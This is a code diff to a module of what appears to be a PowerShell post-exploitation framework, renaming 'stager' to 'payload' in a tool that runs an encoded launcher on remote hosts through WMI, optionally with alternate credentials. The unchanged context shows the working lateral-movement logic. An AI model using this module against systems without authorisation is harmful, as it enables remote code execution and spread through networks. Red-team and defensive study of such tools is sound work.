@@ -9,7 +9,7 @@ class Module:
 
             'Author': ['@harmj0y'],
 
-            'Description': ('Executes a stager on remote hosts using WMI.'),
+            'Description': ('Executes a payload on remote hosts using WMI.'),
 
             'Background' : False,
 
@@ -41,7 +41,7 @@ class Module:
                 'Value'         :   ''                
             },
             'ComputerName' : {
-                'Description'   :   'Host[s] to execute the stager on, comma separated.',
+                'Description'   :   'Host[s] to execute the payload on, comma separated.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
@@ -126,18 +126,18 @@ class Module:
         else:
 
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
 
             if launcher == "":
                 return ""
             else:
-                stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
+                payloadCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
 
                 # build the WMI execution string
                 computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""
 
                 script += " -ComputerName @("+computerNames+")"
-                script += " -ArgumentList \"" + stagerCode + "\""
+                script += " -ArgumentList \"" + payloadCode + "\""
 
                 # if we're supplying alternate user credentials
                 if userName != '':
